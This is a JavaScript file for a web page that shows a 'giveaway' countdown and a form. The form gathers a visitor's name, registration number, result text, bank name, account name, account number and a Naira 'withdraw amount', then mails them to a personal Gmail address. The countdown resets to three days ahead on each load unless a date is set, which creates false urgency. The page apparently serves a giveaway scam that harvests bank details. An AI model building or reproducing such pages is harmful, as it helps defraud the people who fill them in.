// Upgraded script: Countdown + improved mailto form handling
document.addEventListener('DOMContentLoaded', () => {
    // --- Countdown setup ---
    const countdownEl = document.getElementById('countdown');

    // Allow configurable target date via data-target attribute (ISO string). Fallback: 3 days from now.
    let targetDate = new Date();
    if (countdownEl && countdownEl.dataset && countdownEl.dataset.target) {
        const parsed = new Date(countdownEl.dataset.target);
        if (!isNaN(parsed)) targetDate = parsed;
        else targetDate.setDate(targetDate.getDate() + 3);
    } else {
        targetDate.setDate(targetDate.getDate() + 3);
    }
    const targetTime = targetDate.getTime();

    const daysEl = document.getElementById('days');
    const hoursEl = document.getElementById('hours');
    const minsEl = document.getElementById('mins');
    const secsEl = document.getElementById('seconds') || document.getElementById('secs'); // optional element

    let intervalId = null;

    function updateCountdown() {
        const now = Date.now();
        const distance = targetTime - now;

        if (distance <= 0) {
            if (daysEl) { daysEl.textContent = '00'; }
            if (hoursEl) { hoursEl.textContent = '00'; }
            if (minsEl) { minsEl.textContent = '00'; }
            if (secsEl) { secsEl.textContent = '00'; }
            if (countdownEl) { countdownEl.innerHTML = 'GIVEAWAY EXPIRED'; }
            if (intervalId) { clearInterval(intervalId); }
            return;
        }

        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);

        if (daysEl) { daysEl.textContent = String(days).padStart(2, '0'); }
        if (hoursEl) { hoursEl.textContent = String(hours).padStart(2, '0'); }
        if (minsEl) { minsEl.textContent = String(minutes).padStart(2, '0'); }
        if (secsEl) { secsEl.textContent = String(seconds).padStart(2, '0'); }
    }

    updateCountdown();
    intervalId = setInterval(updateCountdown, 1000);

    // --- Form handling (mailto) ---
    const form = document.getElementById('resultForm');
    if (!form) return;

    const submitBtn = form.querySelector('button[type="submit"]');

    function setButtonState(disabled, text) {
        if (!submitBtn) return;
        submitBtn.disabled = disabled;
        if (text) {
            submitBtn.dataset.prevText = submitBtn.textContent;
            submitBtn.textContent = text;
        } else if (submitBtn.dataset.prevText) {
            submitBtn.textContent = submitBtn.dataset.prevText;
            delete submitBtn.dataset.prevText;
        }
    }

    function sanitize(input, maxLen = 2000) {
        return String(input || '').trim().slice(0, maxLen);
    }

    async function copyToClipboard(text) {
        try {
            await navigator.clipboard.writeText(text);
            return true;
        } catch (err) {
            return false;
        }
    }

    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        setButtonState(true, 'Preparing...');

        const name = sanitize(document.getElementById('senderName')?.value || '', 100);
        const email = sanitize(document.getElementById('senderEmail')?.value || '', 150);
        const reg = sanitize(document.getElementById('regNumber')?.value || '', 50);
        const result = sanitize(document.getElementById('resultText')?.value || '', 1200);
        const bank = sanitize(document.getElementById('bankName')?.value || '', 100);
        const acctName = sanitize(document.getElementById('accountName')?.value || '', 100);
        const acctNum = sanitize(document.getElementById('accountNumber')?.value || '', 20);
        const amountRaw = document.getElementById('withdrawAmount')?.value || '0';
        const amount = Number(amountRaw);

        // Basic validation
        if (!name) { alert('Please enter your name.'); setButtonState(false); return; }
        if (!result) { alert('Please provide your result text.'); setButtonState(false); return; }
        if (!bank) { alert('Please enter bank name.'); setButtonState(false); return; }
        if (!acctName) { alert('Please enter account name.'); setButtonState(false); return; }
        if (!acctNum || !/^\d{6,12}$/.test(acctNum)) {
            alert('Please enter a valid account number (6-12 digits).'); setButtonState(false); return;
        }

        if (isNaN(amount) || amount < 0 || amount > 1000) {
            alert('Withdraw amount must be a number between 0 and 1000 Naira.'); setButtonState(false); return;
        }

        // Compose email body
        const to = 'john29mike20@gmail.com';
        const subject = `New Result Submission from ${name}`;
        let body = '';
        body += `Name: ${name}\r\n`;
        if (email) body += `Sender Email: ${email}\r\n`;
        if (reg) body += `Reg: ${reg}\r\n`;
        body += `Result:\r\n${result}\r\n\r\n`;
        body += `Bank Name: ${bank}\r\n`;
        body += `Account Name: ${acctName}\r\n`;
        body += `Account Number: ${acctNum}\r\n`;
        body += `Withdraw Amount: ₦${amount}\r\n`;

        const encodedSubject = encodeURIComponent(subject);
        const encodedBody = encodeURIComponent(body);

        const maxMailtoLength = 1900; // safe practical limit
        if (encodedBody.length > maxMailtoLength) {
            // Try copy-to-clipboard fallback and open mail client with short note
            const copied = await copyToClipboard(body);
            if (copied) {
                const shortBody = encodeURIComponent('Result copied to clipboard. Please paste into the email body.');
                const mailto = `mailto:${to}?subject=${encodedSubject}&body=${shortBody}`;
                window.open(mailto);
                alert('Message was too long. The full content has been copied to your clipboard. Please paste it into the email that opened.');
                setButtonState(false);
                return;
            } else {
                alert('Message too long to send and clipboard copy failed. Please shorten your message.');
                setButtonState(false);
                return;
            }
        }

        const mailto = `mailto:${to}?subject=${encodedSubject}&body=${encodedBody}`;

        // open mail client in a new window/tab (better UX than replacing location)
        window.open(mailto);

        // Small UX: re-enable button after a short delay
        setTimeout(() => setButtonState(false), 1500);
    });
});